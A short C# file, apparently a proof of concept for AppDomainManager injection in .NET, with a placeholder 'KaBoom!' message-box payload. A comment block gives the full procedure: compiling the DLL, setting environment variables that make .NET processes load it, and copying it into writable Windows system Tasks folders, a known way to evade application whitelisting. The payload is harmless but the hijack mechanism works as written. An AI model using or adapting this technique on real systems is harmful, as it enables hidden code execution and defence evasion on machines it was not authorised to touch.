// xref: https://gist.github.com/secdev-01/96e7abbac1baa8446bdfd5f5637d0480

using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;


public sealed class MyAppDomainManager : AppDomainManager
{
  
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
		System.Windows.Forms.MessageBox.Show("AppDomain - KaBoom!");
		// You have more control here than I am demonstrating. For example, you can set ApplicationBase, 
		// Or you can Override the Assembly Resolver, etc...
        return;
    }
}

/*

C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:tasks.dll tasks.cs
set APPDOMAIN_MANAGER_ASM=tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
set APPDOMAIN_MANAGER_TYPE=MyAppDomainManager
set COMPLUS_Version=v4.0.30319
copy tasks.dll C:\Windows\System32\Tasks\tasks.dll
copy tasks.dll C:\Windows\SysWow64\Tasks\tasks.dll


*/
